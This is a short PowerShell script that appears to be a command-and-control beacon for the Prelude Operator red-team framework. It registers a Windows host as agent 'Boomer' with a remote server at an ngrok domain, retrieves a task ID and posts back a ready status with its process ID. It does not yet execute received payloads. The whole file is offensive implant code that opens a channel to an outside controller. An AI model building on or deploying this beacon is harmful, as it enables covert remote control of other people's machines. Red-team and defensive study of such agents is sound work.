$PreludeHTTPDomain = "https://boomtown.ngrok.io"
$Executors = @()
$Executors += 'psh'
$Links = @()

$jsonBase = [pscustomobject]@{
    Name = "Boomer"
    Target = ""
    Hostname = "APTz"
    Location = ""
    Platform = "windows"
    Executors = $executors
    Range = "BoomTown"
	"Pwd" = ""
	"Sleep" = 10
	Executing= ""
    Links = $Links

}

$delivery = $jsonBase | ConvertTo-Json
# Checkin - Get Task

$response = Invoke-RestMethod -Uri $PreludeHTTPDomain -Method Post -Body $delivery -ContentType "application/json"
$ID = $response.links.ID


# Send Response
$Links += [pscustomobject]@{
    'ID'="$ID";
    'Executor'='psh';
	'Payload'=''
	'Request'= ""
    'Response'="Ready To Roll Out!";
    'Status'='0';
    'Pid'="$Pid"
}

$jsonBase = [pscustomobject]@{
    Name = "Boomer"
    Target = ""
    Hostname = "APTz"
    Location = ""
    Platform = "windows"
    Executors = $executors
    Range = "BoomTown"
	"Pwd" = ""
	"Sleep" = 10
	Executing= ""
    Links = $Links

}

$deliveryResponse = $jsonBase | ConvertTo-Json
$response_delivery = Invoke-RestMethod -Uri $PreludeHTTPDomain -Method Post -Body $deliveryResponse  -ContentType "application/json"
